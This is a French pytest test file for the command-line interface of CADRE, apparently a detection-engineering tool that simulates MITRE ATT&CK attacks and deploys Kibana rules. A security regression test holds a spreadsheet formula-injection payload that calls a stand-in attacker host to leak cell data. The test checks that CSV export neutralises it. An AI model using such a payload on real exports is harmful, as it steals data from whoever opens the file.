"""
Tests pour l'interface CLI (src/cadre/cli.py).

Utilise click.testing.CliRunner pour invoquer les commandes sans passer
par un vrai terminal. Les dépendances lourdes (coffre-fort système,
requêtes réseau, boucle infinie, serveur HTTP) sont mockées pour garder
les tests rapides, déterministes et sans effet de bord sur le dépôt.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest
from click.testing import CliRunner

from cadre.catalogue_attaques import CATALOGUE
from cadre.cli import cli


@pytest.fixture
def runner():
    return CliRunner()


@pytest.fixture
def coffre_factice(monkeypatch):
    """Coffre-fort factice pour ne jamais toucher le vrai keychain/.env."""

    class CoffreFactice:
        def __init__(self):
            self.secrets = {}

        def lister_cles(self):
            return sorted(self.secrets)

        def stocker(self, cle, valeur, methode="auto"):
            self.secrets[cle] = valeur

    coffre = CoffreFactice()
    monkeypatch.setattr("cadre.cli.obtenir_coffre", lambda: coffre)
    return coffre


class TestGroupePrincipal:
    def test_aide(self, runner):
        resultat = runner.invoke(cli, ["--help"])
        assert resultat.exit_code == 0
        assert "CADRE" in resultat.output

    def test_version(self, runner):
        resultat = runner.invoke(cli, ["--version"])
        assert resultat.exit_code == 0
        assert "cadre" in resultat.output.lower()

    def test_verbose_positionne_debug(self, runner, monkeypatch):
        monkeypatch.delenv("CADRE_LOG_LEVEL", raising=False)
        resultat = runner.invoke(cli, ["--verbose", "list"])
        assert resultat.exit_code == 0
        assert os.environ["CADRE_LOG_LEVEL"] == "DEBUG"

    def test_quiet_positionne_warn(self, runner, monkeypatch):
        monkeypatch.delenv("CADRE_LOG_LEVEL", raising=False)
        resultat = runner.invoke(cli, ["--quiet", "list"])
        assert resultat.exit_code == 0
        assert os.environ["CADRE_LOG_LEVEL"] == "WARN"

    def test_verbose_et_quiet_mutuellement_exclusifs(self, runner, monkeypatch):
        monkeypatch.delenv("CADRE_LOG_LEVEL", raising=False)
        resultat = runner.invoke(cli, ["--verbose", "--quiet", "list"])
        assert resultat.exit_code == 0
        assert "mutuellement exclusifs" in resultat.output
        assert "CADRE_LOG_LEVEL" not in os.environ


class TestCommandeList:
    def test_liste_catalogue(self, runner):
        resultat = runner.invoke(cli, ["list"])
        assert resultat.exit_code == 0
        assert CATALOGUE[0].id in resultat.output
        assert CATALOGUE[0].technique_mitre in resultat.output

    def test_export_csv(self, runner, tmp_path, monkeypatch):
        import csv as csv_module

        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["list", "--csv", "catalogue.csv"])
        assert resultat.exit_code == 0
        # Le CSV doit commencer par un BOM UTF-8 (compat Excel/LibreOffice :
        # sans lui, les accents s'affichent en mojibake "RÃ¨gle").
        with open("catalogue.csv", "rb") as fb:
            assert fb.read(3) == b"\xef\xbb\xbf"
        # utf-8-sig : le BOM est retiré à la lecture, sinon la 1re colonne
        # deviendrait "﻿id" et lignes[0]["id"] lèverait KeyError.
        with open("catalogue.csv", encoding="utf-8-sig") as f:
            lignes = list(csv_module.DictReader(f))
        assert len(lignes) == len(CATALOGUE)
        assert lignes[0]["id"] == CATALOGUE[0].id
        assert lignes[0]["technique_mitre"] == CATALOGUE[0].technique_mitre

    def test_export_csv_neutralise_une_attaque_perso_malveillante(
        self, runner, tmp_path, monkeypatch
    ):
        """Régression sécurité (audit) : CWE-1236 -- une attaque perso (nom
        provenant d'un brouillon LLM ou saisi par l'utilisateur, source non
        fiable) ne doit jamais planter une formule Excel/LibreOffice dans le
        CSV exporté."""
        from cadre.catalogue_utilisateur import enregistrer_attaque_utilisateur

        monkeypatch.chdir(tmp_path)
        enregistrer_attaque_utilisateur(
            {
                "id": "CADRE-PERSO-CSV",
                "nom": '=HYPERLINK("http://evil.example/steal?"&A1,"Cliquez")',
                "technique_mitre": "T1059.001",
                "tactique_mitre": "Execution",
                "commande": "whoami",
            }
        )
        resultat = runner.invoke(cli, ["list", "--csv", "catalogue.csv"])
        assert resultat.exit_code == 0
        contenu = Path("catalogue.csv").read_text(encoding="utf-8-sig")
        assert "'=HYPERLINK" in contenu
        assert ",=HYPERLINK" not in contenu


class TestCommandeStats:
    def test_stats_catalogue_json(self, runner):
        resultat = runner.invoke(cli, ["stats", "--json"])
        assert resultat.exit_code == 0
        assert '"total"' in resultat.output

    def test_stats_json_pur_sur_stdout(self):
        """F3 : stdout est du JSON pur (bannière sur stderr) — testé en
        subprocess pour une vraie séparation des flux, comme un `| jq` réel."""
        import json
        import subprocess
        import sys

        proc = subprocess.run(
            [sys.executable, "-m", "cadre.cli", "stats", "--json"],
            capture_output=True,
            text=True,
            encoding="utf-8",
            check=False,
        )
        assert proc.returncode == 0
        data = json.loads(proc.stdout)  # stdout SEUL doit parser sans la bannière
        assert "total" in data
        # la bannière décorative (logo ASCII) est bien sur stderr, pas stdout
        assert "Adversary-Driven" in proc.stderr

    def test_stats_catalogue_affichage_riche(self, runner):
        resultat = runner.invoke(cli, ["stats"])
        assert resultat.exit_code == 0
        assert "Statistiques du catalogue" in resultat.output
        assert "Par tactique MITRE" in resultat.output
        assert "Persistence" in resultat.output


class TestCommandeInit:
    def test_list_sans_secrets(self, runner, coffre_factice):
        resultat = runner.invoke(cli, ["init", "--list"])
        assert resultat.exit_code == 0
        assert "Aucun secret configuré" in resultat.output

    def test_list_avec_secrets(self, runner, coffre_factice):
        coffre_factice.secrets["CADRE_VM_PASS"] = "x"
        resultat = runner.invoke(cli, ["init", "--list"])
        assert resultat.exit_code == 0
        assert "CADRE_VM_PASS" in resultat.output

    def test_set_secret_valide(self, runner, coffre_factice):
        resultat = runner.invoke(cli, ["init", "--set", "CADRE_VM_PASS=secret123"])
        assert resultat.exit_code == 0
        assert coffre_factice.secrets["CADRE_VM_PASS"] == "secret123"
        assert "stocké" in resultat.output

    def test_set_secret_format_invalide(self, runner, coffre_factice):
        resultat = runner.invoke(cli, ["init", "--set", "PAS_DE_SIGNE_EGAL"])
        assert resultat.exit_code == 0
        assert "Format invalide" in resultat.output
        assert coffre_factice.secrets == {}

    def test_set_secret_echec_coffre_narrete_pas_les_autres(self, runner, coffre_factice):
        """Régression : coffre.stocker() peut lever ErreurSecurite (ex.
        `--set CLE=`, valeur vide -- vérifié en réel : traceback Python brut
        avant ce correctif) -- non rattrapée, elle interrompait toute la
        commande, y compris les --set valides listés APRÈS celui en échec."""
        from cadre.coffre_fort import ErreurSecurite

        original_stocker = coffre_factice.stocker

        def stocker_qui_echoue_sur_vide(cle, valeur, methode="auto"):
            if not valeur:
                raise ErreurSecurite("La valeur du secret doit être une chaîne non vide.")
            original_stocker(cle, valeur, methode)

        coffre_factice.stocker = stocker_qui_echoue_sur_vide
        resultat = runner.invoke(
            cli, ["init", "--set", "CADRE_VM_PASS=", "--set", "CADRE_ELASTIC_PASS=ok"]
        )
        assert resultat.exit_code == 0  # pas de traceback
        assert "Échec" in resultat.output
        assert coffre_factice.secrets == {"CADRE_ELASTIC_PASS": "ok"}  # le 2e a quand même marché

    def test_mode_interactif_tout_ignorer(self, runner, coffre_factice, monkeypatch):
        # getpass.getpass() lève GetPassWarning hors tty (promue en erreur par
        # filterwarnings=error) ; on la mocke comme les autres prompts vides.
        monkeypatch.setattr("getpass.getpass", lambda prompt="": "")
        # 7 secrets demandés : une ligne vide par prompt suffit à tous les ignorer.
        resultat = runner.invoke(cli, ["init"], input="\n" * 10)
        assert resultat.exit_code == 0
        assert "Initialisation terminée" in resultat.output
        assert coffre_factice.secrets == {}


class TestCommandeCycle:
    def test_technique_vide_refusee(self, runner, tmp_path, monkeypatch):
        """Régression (audit) : `--technique ""` (chaîne vide) passait le
        typage click puis filtrait TOUJOURS sur technique_mitre in [""] --
        aucune attaque du catalogue n'ayant une technique vide, le cycle
        tournait silencieusement sur 0 attaque, sans jamais avertir
        l'utilisateur que son filtre ne correspond à rien."""
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--technique", "", "--simulate"])
        assert resultat.exit_code != 0
        assert "vide" in resultat.output.lower()

    @pytest.mark.parametrize("valeur", [0, -1, -180])
    def test_timeout_indexation_non_positif_refuse(self, runner, valeur, tmp_path, monkeypatch):
        """Régression (audit) : `--timeout-indexation` n'était jamais validé
        -- un timeout <= 0 se propageait jusqu'à attendre_indexation(), dont
        la toute première comparaison (elapsed > timeout_max_sec) est déjà
        vraie avant le moindre appel réseau : chaque attaque du cycle serait
        silencieusement déclarée ANGLE_MORT, sans avertissement ni erreur."""
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--timeout-indexation", str(valeur), "--simulate"])
        assert resultat.exit_code != 0
        assert "invalide" in resultat.output.lower()

    def test_timeout_indexation_positif_accepte(self, runner, tmp_path, monkeypatch):
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(
            cli,
            ["cycle", "--id", attaque_id, "--timeout-indexation", "30", "--simulate"],
        )
        assert resultat.exit_code == 0

    def test_id_inconnu(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", "CADRE-INCONNU-999", "--simulate"])
        assert resultat.exit_code == 1
        assert "introuvables" in resultat.output

    def test_simulation_id_connu(self, runner, tmp_path, monkeypatch):
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
        assert resultat.exit_code == 0
        assert "Simulées : 1" in resultat.output

    def test_filtre_technique_ne_plante_pas(self, runner, tmp_path, monkeypatch):
        """Régression : la commande Click 'list' nommait sa fonction Python
        list(), masquant le builtin dans tout cli.py — cadre cycle
        --technique appelait list(technique) qui résolvait vers cette
        commande au lieu du constructeur natif, plantant silencieusement."""
        technique = CATALOGUE[0].technique_mitre
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--technique", technique, "--simulate"])
        assert resultat.exit_code == 0

    def test_cycle_complet_verrou_actif_message_clair(self, runner, monkeypatch, tmp_path):
        """Régression (audit) : VerrouCycleActifError levée par
        executer_cycle_complet() (branche sans --id) n'était pas rattrapée
        -- traceback Python brute au lieu d'un message clair."""
        from cadre.orchestrateur import VerrouCycleActifError

        def leve_verrou(*a, **k):
            raise VerrouCycleActifError("cycle déjà en cours (verrou tenu par PID 4242)")

        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.executer_cycle_complet", leve_verrou
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle"])
        assert resultat.exit_code != 0
        assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
        assert "déjà en cours" in resultat.output

    def test_simulation_avec_llm_indisponible_degrade_proprement(
        self, runner, monkeypatch, tmp_path
    ):
        """--llm avec Ollama injoignable ne doit jamais faire échouer le cycle."""
        import requests

        appels_llm = []

        def post_qui_echoue(url, **kwargs):
            appels_llm.append(url)
            raise requests.exceptions.ConnectionError("Ollama indisponible")

        monkeypatch.setattr("requests.post", post_qui_echoue)
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate", "--llm"])
        assert resultat.exit_code == 0
        assert "Simulées : 1" in resultat.output
        assert appels_llm  # l'assistant a bien été sollicité

    def test_ia_draft_regles_transmis_a_la_config(self, runner, monkeypatch, tmp_path):
        """--ia-draft-regles doit positionner ia_brouillon_regle=True dans
        la config transmise à l'orchestrateur (désactivé par défaut)."""
        configs_captures = []
        from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur

        def orchestrateur_qui_capture(config=None):
            configs_captures.append(config)
            return VraiOrchestrateur(config=config)

        monkeypatch.setattr("cadre.cli.OrchestrateurCADRE", orchestrateur_qui_capture)
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(
            cli, ["cycle", "--id", attaque_id, "--simulate", "--ia-draft-regles"]
        )
        assert resultat.exit_code == 0
        assert configs_captures[0]["ia_brouillon_regle"] is True

    def test_ia_draft_regles_desactive_par_defaut(self, runner, monkeypatch, tmp_path):
        configs_captures = []
        from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur

        def orchestrateur_qui_capture(config=None):
            configs_captures.append(config)
            return VraiOrchestrateur(config=config)

        monkeypatch.setattr("cadre.cli.OrchestrateurCADRE", orchestrateur_qui_capture)
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
        assert configs_captures[0]["ia_brouillon_regle"] is False

    def test_parallel_transmis_a_executer_cycle_complet(self, runner, monkeypatch, tmp_path):
        """G2 : --parallel doit atteindre executer_cycle_complet(parallele=True)
        sur le chemin catalogue/--technique (le seul qui appelle cette méthode)."""
        from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur

        captures = []
        original = VraiOrchestrateur.executer_cycle_complet

        def espion(self, *a, **k):
            captures.append(k)
            return original(self, *a, **k)

        monkeypatch.setattr(VraiOrchestrateur, "executer_cycle_complet", espion)
        technique = CATALOGUE[0].technique_mitre
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(
            cli, ["cycle", "--technique", technique, "--simulate", "--parallel"]
        )
        assert resultat.exit_code == 0
        assert captures[0]["parallele"] is True

    def test_sans_parallel_flag_transmet_false(self, runner, monkeypatch, tmp_path):
        from cadre.orchestrateur import OrchestrateurCADRE as VraiOrchestrateur

        captures = []
        original = VraiOrchestrateur.executer_cycle_complet

        def espion(self, *a, **k):
            captures.append(k)
            return original(self, *a, **k)

        monkeypatch.setattr(VraiOrchestrateur, "executer_cycle_complet", espion)
        technique = CATALOGUE[0].technique_mitre
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--technique", technique, "--simulate"])
        assert resultat.exit_code == 0
        assert captures[0]["parallele"] is False

    def test_demo_avec_parallel_avertit_et_reste_sequentiel(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--demo", "--simulate", "--parallel"])
        assert resultat.exit_code == 0
        assert "ignoré" in resultat.output

    def test_id_avec_parallel_avertit_et_comportement_inchange(self, runner, tmp_path, monkeypatch):
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate", "--parallel"])
        assert resultat.exit_code == 0
        assert "ignoré" in resultat.output
        assert "Simulées : 1" in resultat.output

    def test_revue_sans_id_refuse(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--revue"])
        assert resultat.exit_code != 0
        assert "--id" in resultat.output

    def test_revue_avec_id_natif_refuse(self, runner, tmp_path, monkeypatch):
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--revue"])
        assert resultat.exit_code != 0
        assert "refusé" in resultat.output
        assert attaque_id in resultat.output

    def test_revue_avec_id_perso_propage_arreter_avant_deploiement(
        self, runner, monkeypatch, exemple_attaque, tmp_path
    ):
        """exemple_attaque.id ('CADRE-TEST-001') n'appartient pas au
        catalogue natif -- doit passer le garde-fou et propager
        arreter_avant_deploiement=True jusqu'à executer_attaque_complete."""
        monkeypatch.setattr("cadre.cli.catalogue_actif", lambda: [*CATALOGUE, exemple_attaque])
        captures = []

        def executer_qui_capture(self, attaque, **kwargs):
            captures.append(kwargs)
            return {
                "id": attaque.id,
                "statut": "EN_ATTENTE_REVUE",
                "rule_id_stable": "cadre-test-001",
            }

        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.executer_attaque_complete",
            executer_qui_capture,
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", exemple_attaque.id, "--revue"])
        assert resultat.exit_code == 0
        assert captures == [{"arreter_avant_deploiement": True, "source_revue": "cycle"}]
        assert "en attente de revue" in resultat.output
        assert "cadre revue approuver cadre-test-001" in resultat.output
        # Régression sécurité (audit) « pipeline figé en revue » : le
        # panneau de synthèse final ne comptait ni VALIDE_NON_DEPLOYE, ni
        # EN_ATTENTE_REVUE, ni REJETE -- un cycle --revue (où CHAQUE attaque
        # finit forcément en EN_ATTENTE_REVUE) affichait Validées: 0, Angles
        # morts: 0, Simulées: 0, Erreurs: 0 : tout à zéro, comme si rien ne
        # s'était passé, alors que la revue était bien en attente.
        assert "En attente de revue : 1" in resultat.output


class TestVerrouCycleInterProcessusViaId:
    """F-009 : `cadre cycle --id ...` (mode réel, sans --simulate) appelle
    executer_attaque_complete() par identifiant directement, sans jamais
    passer par executer_cycle_complet() -- sans le verrou acquis dans cette
    branche, deux `cadre cycle --id` réels (ou un et le dashboard) pouvaient
    tourner en même temps contre la même cible. `_CHEMIN_VERROU_CYCLE` est
    relatif (./cadre_cycle.lock) : `monkeypatch.chdir(tmp_path)` (cwd isolé)
    suffit à l'isoler, pas besoin de monkeypatch dédié sur le chemin lui-même."""

    @pytest.fixture(autouse=True)
    def _verrou_isole(self):
        """Surcharge locale (même nom -- priorité à la classe sur la fixture
        globale de conftest.py) : cette classe teste délibérément le chemin
        RÉEL, non redirigé (`_CHEMIN_VERROU_CYCLE` par défaut, relatif :
        ./cadre_cycle.lock) -- `monkeypatch.chdir(tmp_path)` (cwd isolé)
        suffit ici. La fixture globale redirigerait vers tmp_path et
        casserait ces 3 tests, qui écrivent directement dans
        `Path("cadre_cycle.lock")` relatif au cwd isolé."""

    def test_id_reel_refuse_si_deja_verrouille(self, runner, tmp_path, monkeypatch):
        """Régression (audit) : VerrouCycleActifError n'était rattrapée nulle
        part dans la CLI -- une traceback Python brute remontait à
        l'utilisateur au lieu d'un message clair. Doit maintenant échouer
        proprement (exit_code != 0, PAS d'exception qui remonte) avec un
        message actionnable affiché."""
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        Path("cadre_cycle.lock").write_text(str(os.getpid()), encoding="utf-8")
        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id])
        assert resultat.exit_code != 0
        assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
        assert "déjà en cours" in resultat.output

    def test_id_reel_libere_le_verrou_apres_succes(
        self, runner, monkeypatch, exemple_attaque, tmp_path
    ):
        monkeypatch.setattr("cadre.cli.catalogue_actif", lambda: [*CATALOGUE, exemple_attaque])
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.executer_attaque_complete",
            lambda self, attaque, **kwargs: {
                "id": attaque.id,
                "statut": "EN_ATTENTE_REVUE",
                "rule_id_stable": "cadre-test-001",
            },
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--id", exemple_attaque.id, "--revue"])
        assert resultat.exit_code == 0
        assert not Path("cadre_cycle.lock").exists()  # libéré, jamais laissé traîner

    def test_id_simulate_n_est_jamais_bloque_par_un_verrou_existant(
        self, runner, tmp_path, monkeypatch
    ):
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        Path("cadre_cycle.lock").write_text(str(os.getpid()), encoding="utf-8")
        resultat = runner.invoke(cli, ["cycle", "--id", attaque_id, "--simulate"])
        assert resultat.exit_code == 0
        assert "Simulées : 1" in resultat.output


class TestCommandeCycleDryRun:
    def test_dry_run_liste_sans_rien_executer(self, runner, monkeypatch, tmp_path):
        """--dry-run ne doit jamais instancier OrchestrateurCADRE (donc
        jamais toucher WinRM/Elasticsearch/coffre-fort)."""

        def orchestrateur_qui_ne_devrait_jamais_etre_appele(*a, **k):
            raise AssertionError("OrchestrateurCADRE ne doit pas être instancié en --dry-run")

        monkeypatch.setattr(
            "cadre.cli.OrchestrateurCADRE", orchestrateur_qui_ne_devrait_jamais_etre_appele
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--dry-run"])
        assert resultat.exit_code == 0
        assert "Dry-run" in resultat.output
        assert "Aucune commande n'a été exécutée" in resultat.output

    def test_dry_run_avec_id_specifique(self, runner, tmp_path, monkeypatch):
        attaque_id = CATALOGUE[0].id
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--dry-run", "--id", attaque_id])
        assert resultat.exit_code == 0
        assert attaque_id in resultat.output

    def test_dry_run_id_inconnu_signale(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["cycle", "--dry-run", "--id", "CADRE-INCONNU-999"])
        assert resultat.exit_code == 0
        assert "introuvables" in resultat.output


class TestCommandeRevue:
    """`cadre revue lister|approuver|rejeter` -- file d'attente de règles
    validées TP/FP mais pas encore déployées dans Kibana."""

    def test_lister_vide(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr("cadre.revue_regles.lister_revues", lambda: [])
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "lister"])
        assert resultat.exit_code == 0
        assert "Aucune règle en attente" in resultat.output

    def test_lister_affiche_les_entrees(self, runner, monkeypatch, tmp_path):
        entree = {
            "rule_id_stable": "cadre-ia-001",
            "technique_mitre": "T1082",
            "nom_regle": "[CADRE] T1082 — Test",
            "nb_tp": 2,
            "nb_fp": 3,
            "chemin_regle_sigma": "rules_generees/CADRE-IA-001.yml",
        }
        monkeypatch.setattr("cadre.revue_regles.lister_revues", lambda: [entree])
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "lister"])
        assert resultat.exit_code == 0
        assert "cadre-ia-001" in resultat.output

    def test_approuver_inexistant(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: None)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-inconnu"])
        assert resultat.exit_code != 0
        assert "Aucune revue" in resultat.output

    def test_approuver_reussi_supprime_lentree(self, runner, monkeypatch, tmp_path):
        entree = {"rule_id_stable": "cadre-ia-001"}
        monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: entree)
        appels_suppression = []

        def supprimer_qui_capture(rid):
            appels_suppression.append(rid)

        monkeypatch.setattr("cadre.revue_regles.supprimer_revue", supprimer_qui_capture)
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.approuver_revue",
            lambda self, entree, forcer=False: {
                "statut": "VALIDE",
                "deploye": True,
                "force": False,
                "nb_tp": 2,
                "nb_fp": 0,
                "raison": "OK",
            },
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001"])
        assert resultat.exit_code == 0
        assert appels_suppression == ["cadre-ia-001"]
        assert "Déployée" in resultat.output

    def test_approuver_echoue_sans_forcer_entree_conservee(self, runner, monkeypatch, tmp_path):
        entree = {"rule_id_stable": "cadre-ia-001"}
        monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: entree)
        appels_suppression = []

        def supprimer_qui_capture(rid):
            appels_suppression.append(rid)

        monkeypatch.setattr("cadre.revue_regles.supprimer_revue", supprimer_qui_capture)
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.approuver_revue",
            lambda self, entree, forcer=False: {
                "statut": "REJETE",
                "deploye": False,
                "force": False,
                "nb_tp": 0,
                "nb_fp": 0,
                "raison": "FAUX_NEGATIF",
            },
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001"])
        assert resultat.exit_code != 0
        assert appels_suppression == []  # l'entrée reste en attente
        assert "Non déployée" in resultat.output

    def test_approuver_forcer_transmis(self, runner, monkeypatch, tmp_path):
        entree = {"rule_id_stable": "cadre-ia-001"}
        monkeypatch.setattr("cadre.revue_regles.obtenir_revue", lambda rid: entree)
        monkeypatch.setattr("cadre.revue_regles.supprimer_revue", lambda rid: True)
        forcer_recus = []

        def approuver_qui_capture(self, entree, forcer=False):
            forcer_recus.append(forcer)
            return {
                "statut": "VALIDE",
                "deploye": True,
                "force": True,
                "nb_tp": 0,
                "nb_fp": 0,
                "raison": "OK",
            }

        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.approuver_revue", approuver_qui_capture
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "approuver", "cadre-ia-001", "--forcer"])
        assert resultat.exit_code == 0
        assert forcer_recus == [True]
        assert "forcée" in resultat.output

    def test_rejeter_existant(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr("cadre.revue_regles.supprimer_revue", lambda rid: True)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "rejeter", "cadre-ia-001"])
        assert resultat.exit_code == 0
        assert "Rejetée" in resultat.output

    def test_rejeter_inexistant(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr("cadre.revue_regles.supprimer_revue", lambda rid: False)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["revue", "rejeter", "cadre-inconnu"])
        assert resultat.exit_code != 0
        assert "Aucune revue" in resultat.output


class TestCommandeRegle:
    """`cadre regle lire|editer|pousser` -- édition encadrée d'une règle
    DÉJÀ déployée dans Kibana."""

    def test_lire_introuvable(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana", lambda self, rid: None
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["regle", "lire", "cadre-inconnu"])
        assert resultat.exit_code != 0
        assert "Introuvable" in resultat.output

    def test_lire_reussi(self, runner, monkeypatch, tmp_path):
        donnees = {
            "name": "[CADRE] T1082 — Test",
            "type": "query",
            "enabled": True,
            "index": ["winlogbeat-*"],
            "tags": ["CADRE", "T1082"],
            "query": "event.code:1",
            "language": "lucene",
        }
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana",
            lambda self, rid: donnees,
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["regle", "lire", "cadre-dis-001"])
        assert resultat.exit_code == 0
        assert "[CADRE] T1082 — Test" in resultat.output

    def test_editer_introuvable_dans_kibana(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana", lambda self, rid: None
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["regle", "editer", "cadre-inconnu"])
        assert resultat.exit_code != 0
        assert "Introuvable" in resultat.output

    def test_editer_bootstrap_depuis_le_catalogue(self, runner, monkeypatch, tmp_path):
        """Si le fichier local n'existe pas mais l'ID correspond à une
        attaque catalogue, un YAML de départ est généré."""
        attaque_id = CATALOGUE[0].id
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana",
            lambda self, rid: {"name": "existe"},
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["regle", "editer", attaque_id.lower()])
        assert resultat.exit_code == 0
        assert Path(f"rules_generees/{attaque_id}.yml").is_file()

    def test_editer_sans_fichier_ni_attaque_demande_loption(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.lire_regle_kibana",
            lambda self, rid: {"name": "existe"},
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["regle", "editer", "cadre-inconnu-999"])
        assert resultat.exit_code != 0
        assert "--fichier" in resultat.output

    def test_pousser_fichier_introuvable(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
        assert resultat.exit_code != 0
        assert "Fichier introuvable" in resultat.output

    def test_pousser_reussi(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.redeployer_regle_editee",
            lambda self, rid, yaml, pipeline="ecs_windows", forcer=False: {
                "statut": "VALIDE",
                "deploye": True,
                "force": False,
                "nb_tp": 2,
                "nb_fp": 1,
                "raison": "OK",
            },
        )
        monkeypatch.chdir(tmp_path)
        Path("rules_generees").mkdir()
        Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
        assert resultat.exit_code == 0
        assert "Déployée" in resultat.output

    def test_pousser_echoue_sans_forcer(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.redeployer_regle_editee",
            lambda self, rid, yaml, pipeline="ecs_windows", forcer=False: {
                "statut": "REJETE",
                "deploye": False,
                "force": False,
                "nb_tp": 0,
                "nb_fp": 0,
                "raison": "FAUX_NEGATIF",
            },
        )
        monkeypatch.chdir(tmp_path)
        Path("rules_generees").mkdir()
        Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
        assert resultat.exit_code != 0
        assert "Non déployée" in resultat.output

    def test_pousser_forcer_transmis(self, runner, monkeypatch, tmp_path):
        forcer_recus = []

        def redeployer_qui_capture(self, rid, yaml, pipeline="ecs_windows", forcer=False):
            forcer_recus.append(forcer)
            return {
                "statut": "VALIDE",
                "deploye": True,
                "force": True,
                "nb_tp": 0,
                "nb_fp": 0,
                "raison": "OK",
            }

        monkeypatch.setattr(
            "cadre.orchestrateur.OrchestrateurCADRE.redeployer_regle_editee",
            redeployer_qui_capture,
        )
        monkeypatch.chdir(tmp_path)
        Path("rules_generees").mkdir()
        Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
